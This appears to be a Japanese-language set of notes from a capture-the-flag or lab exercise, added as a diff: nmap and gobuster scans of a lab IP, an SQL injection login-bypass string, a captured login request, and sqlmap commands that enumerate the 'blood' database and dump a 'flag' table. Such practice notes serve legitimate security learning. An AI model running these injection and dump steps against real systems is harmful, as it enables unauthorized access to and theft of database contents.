@@ -1,0 +1,54 @@
+-sC:デフォルトスクリプトを使用してスキャンを実行します。
+-sV:サービスのバージョンを検出します。
+-oN:スキャン結果をnmap.logというファイルに保存します。
+nmap -sC -sV -oN nmap.log 10.48.137.234
+
+
+-u:ターゲットURLを指定します。
+-w:使用するワードリストを指定します。
+-t:スレッド数を指定します。
+gobuster dir -u http://10.48.137.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+
+
+SQLインジェクションの例:
+'or'1=1' #
+
+
+
+
+devtoolからauth.phpの要求ヘッダーをコピー
+
+POST /blood/auth.php HTTP/1.1
+Host: 10.48.137.234
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: ja,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: http://10.48.137.234
+Connection: keep-alive
+Referer: http://10.48.137.234/blood/login.php?error=true
+Cookie: PHPSESSID=0l4m2i8knp8irdn95ghv9lbfg1
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+要求ペイロード 生データ
+username=admin&password=admin
+
+sqlmap -r test.txt -p username --dbs
+bloodというデータベースが見つかる
+
+
+sqlmap -r test.txt -p username --current-user
+current user: 'root@localhost'
+
+
+-D:データベースを指定します。
+--tables:テーブルを列挙します。
+sqlmap -r post_data.txt -p username -D blood --tables
+
+
+-T:テーブルを指定します。
+--dump:テーブルの内容をダンプします。
+sqlmap -r post_data.txt -p username -D blood -T flag --dump
